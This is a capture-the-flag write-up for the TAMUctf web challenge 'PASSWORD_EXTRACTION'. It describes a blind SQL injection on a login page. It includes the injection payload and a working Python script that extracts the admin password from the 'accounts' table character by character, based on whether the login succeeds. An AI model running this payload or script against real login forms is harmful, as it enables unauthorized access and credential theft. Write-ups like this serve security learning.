# PASSWORD_EXTRACTION
Web

> The owner of this website often reuses passwords. Can you find out the password they are using on this test server?
>
>http://passwordextraction.tamuctf.com
>
>You do not need to use brute force for this challenge.

Another another guess challenge!!

We guess that this is vulnerable to SQLi, and indeed it is. The flag is the admin password. Pretty standard stuff.

We can do a char-by-char bruteforce of the password.

We can guess the table and column names of the database (or use some SQLi tricks, but that's left as an exercise to the reader).

We can also guess that the admin's username is `admin`.

Our injection will look something like this:
`' or (SELECT MID(password,{},1) FROM accounts LIMIT 0,1)={};-- `

Based on whether or not we get logged in, we can know the letter x at position i.

We implement this in Python, run, and wait for a while.


```python
import requests
import string

url = "http://passwordextraction.tamuctf.com/login.php"

data = {
    "username":"admin",
    "password":"' or (SELECT MID(password,{i},1) FROM accounts LIMIT 0,1)='{char}';-- "
}

# table accounts
# column password

alpha = string.ascii_letters + string.digits + "{}./-"

i = 1
flag = ""
prev = ""

while True:
    for char in alpha:
        payload = dict(data)
        payload["password"] = payload["password"].format(i=i, char=char)
        p = requests.post(url, data=payload)

        if not 'invalid' in p.text.lower():
            flag += char
            i += 1
            break

    print(flag)

    if flag == prev:
        break

    prev = flag
    
print(flag)
```
